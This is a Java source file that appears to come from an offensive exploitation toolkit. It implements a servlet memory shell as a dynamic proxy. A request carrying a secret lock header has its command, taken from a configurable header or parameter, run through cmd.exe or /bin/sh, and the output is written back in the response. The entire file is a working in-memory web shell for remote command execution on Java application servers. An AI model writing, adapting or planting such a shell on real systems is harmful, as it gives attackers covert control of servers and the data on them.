package com.ppp.middleware.memshell;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.MemShellFunction;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 */
@MemShell(MemShell.Servlet)
@MemShellFunction(MemShellFunction.Exec)
@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
public class ServletExec implements InvocationHandler {
    private static String HEADER;
    private static String PARAM;
    private String lockHeaderKey;
    private String lockHeaderValue;

    public ServletExec() {
    }

    public Object invoke(Object proxy, Method method, Object[] args) {
        if (method.getName().equals("service")) {
            run(args[0], args[1]);
        }
        return null;
    }


    private void run(Object servletRequest, Object servletResponse) {
        try {
            String lv = (String) invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
            if(lv == null || !lv.contains(lockHeaderValue)) {
                return;
            }
            Object header = invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
            Object param = invokeMethod(servletRequest, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
            String str = null;
            if (header != null) {
                str = (String) header;
            } else if (param != null) {
                str = (String) param;
            }
            String result = exec(str);
            invokeMethod(servletResponse, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
            Object writer = invokeMethod(servletResponse, "getWriter", new Class[]{}, new Object[]{});
            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
        } catch (Exception e) {
        }
    }

    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
        return exec_result(inputStream);
    }

    public static String exec_result(InputStream inputStream) throws Exception {
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method;
        try {
            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
        } catch (NoSuchMethodException e) {
            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
        }
        method.setAccessible(true);
        return method.invoke(obj, args);
    }
}
